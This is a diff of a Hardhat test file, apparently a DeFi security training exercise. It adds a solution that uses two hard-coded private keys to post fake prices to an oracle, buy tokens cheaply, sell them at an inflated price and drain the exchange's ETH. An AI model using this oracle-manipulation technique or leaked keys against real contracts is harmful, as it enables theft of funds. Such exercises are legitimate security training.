@@ -12,14 +12,15 @@ describe('Oracle Manipulation Exercise 1', function () {
     let deployer, attacker;
     const EXCHANGE_INITIAL_BALANCE = ethers.utils.parseEther('1800');
     const INITIAL_GOLD_PRICE = ethers.utils.parseEther('1.5');
+    const ATTACKER_ETHER_TO_SEND = ethers.utils.parseEther('0.001');
 
     before(async function () {
         /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */
 
         [deployer, attacker] = await ethers.getSigners();
 
-         // Attacker starts with 1 ETH
-         await ethers.provider.send("hardhat_setBalance", [
+        // Attacker starts with 1 ETH
+        await ethers.provider.send("hardhat_setBalance", [
             attacker.address,
             "0xDE0B6B3A7640000", // 1 ETH
         ]);
@@ -68,17 +69,52 @@ describe('Oracle Manipulation Exercise 1', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const privateKey2 = "0x221b93d924f48fcf998c7f20b4be36d12eb1d637a8f49e6e76c154f105e882af";
+        const privateKey3 = "0x390e61fd668d2cf6db3305df8dc5366ed53d58610cee715c57dfd9f780579344";
 
+        const wallet2 = new ethers.Wallet(privateKey2);
+        const wallet3 = new ethers.Wallet(privateKey3);
+
+        const signer2 = wallet2.connect(ethers.provider);
+        const signer3 = wallet3.connect(ethers.provider);
+
+        await this.oracle.connect(signer2).postPrice(1);
+        await this.oracle.connect(signer3).postPrice(1);
+
+        console.log("Gold price is now: ", await this.oracle.getPrice());
+
+        let goldTokenNumber = await this.token.connect(attacker).balanceOf(this.exchange.address);
+
+        // console.log("Gold token in the Exhange is: ", goldTokenNumber);
+        await this.exchange.connect(attacker).buyTokens(1, { value: 1 });
+
+        console.log(
+            "Gold token in the Attacker now  is: ",
+            await this.token.connect(attacker).balanceOf(attacker.address)
+        );
+        await this.oracle.connect(signer2).postPrice(EXCHANGE_INITIAL_BALANCE);
+        await this.oracle.connect(signer3).postPrice(EXCHANGE_INITIAL_BALANCE);
+        // "0.999852786664288407"
+        // "1800, 999710307402565006"
+        console.log("balance of attacker is ", await ethers.provider.getBalance(attacker.address));
+        await this.token.connect(attacker).approve(this.exchange.address, 1);
+        await this.exchange.connect(attacker).sellTokens(1);
+
+        console.log("balance of attacker is ", await ethers.provider.getBalance(attacker.address));
+
+
+        await this.oracle.connect(signer2).postPrice(INITIAL_GOLD_PRICE);
+        await this.oracle.connect(signer3).postPrice(INITIAL_GOLD_PRICE);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange lost almost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.lt(ethers.utils.parseEther('0.1'));
-        
+
         // Attacker's earned a lot of ETH on top of the exchange
         expect(
             await ethers.provider.getBalance(attacker.address)
